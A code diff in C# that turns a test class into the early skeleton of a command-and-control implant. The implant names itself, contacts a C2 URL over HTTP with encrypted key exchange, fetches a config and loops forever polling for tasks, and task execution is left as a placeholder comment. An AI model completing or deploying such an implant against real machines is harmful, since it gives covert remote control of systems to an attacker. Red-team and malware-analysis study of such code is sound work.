@@ -3,33 +3,41 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Threading;
 
-namespace Test23
+namespace Implant
 {
     class Implant
     {
 
 
-        private CommunicationProvider comprov;
-
-        private int sleepTimer = 5;
+        private CommunicationProviderInterface comprov;
 
         private string name;
+
+        private Config config;
 
         public Implant(string c2Url)
         {
             //By Default we wait 5 sec between asking for stuff unless its update. Need to add some randomness in there but thats for later
-            this.sleepTimer = 5;
             this.name = generateImplantName();
 
 
             this.comprov = new HTTPCommunicationProvider(c2Url, this.name);
 
             this.comprov.keyExchangeSetup();
-            //Send a request with the publicKey to the flask server. Server uses public key to encrypt a newly generated aes key. We decrypt it with private cert and store it for future communications
-            
-            string response = comprov.sendEncryptedRequest("lol this is a test", "/test");
-            
+            //Get config aka time between request + comm method. A bit weird to get comm method after I already interacted over HTTP but wtv todo lol
+            this.config = this.comprov.getConfig();
+
+
+            //This is where we pull new tasks and post the results
+            while (true)
+            {
+                Thread.Sleep(this.config.pullInterval);
+                Task task = this.comprov.getNextTask();
+                Console.WriteLine(task.taskName);
+                //EXECUTE TASK
+            }
         }
 
        
